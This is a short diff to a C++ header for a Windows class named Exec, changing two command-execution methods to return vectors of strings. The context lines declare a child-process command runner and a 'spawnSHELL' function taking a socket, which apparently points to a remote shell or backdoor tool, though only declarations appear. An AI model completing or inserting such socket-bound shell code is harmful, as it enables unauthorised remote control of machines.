@@ -24,8 +24,9 @@ class Exec
         void setupAllPipe(); 
         PROCESS_INFORMATION createChildProcess(string &command); //create process childen and execute command.
         
-        string readFromPipe(PROCESS_INFORMATION piProcInfo);  //read pipe and return result (string)
-        string executeCommand(string command);
+        vector<string> readFromPipe(PROCESS_INFORMATION piProcInfo);  //read pipe and return result (string)
+        
+        vector<string> executeCommand(string command);
 
         void spawnSHELL(int sock,wchar_t *prog); //Coming soon baby
         ~Exec();
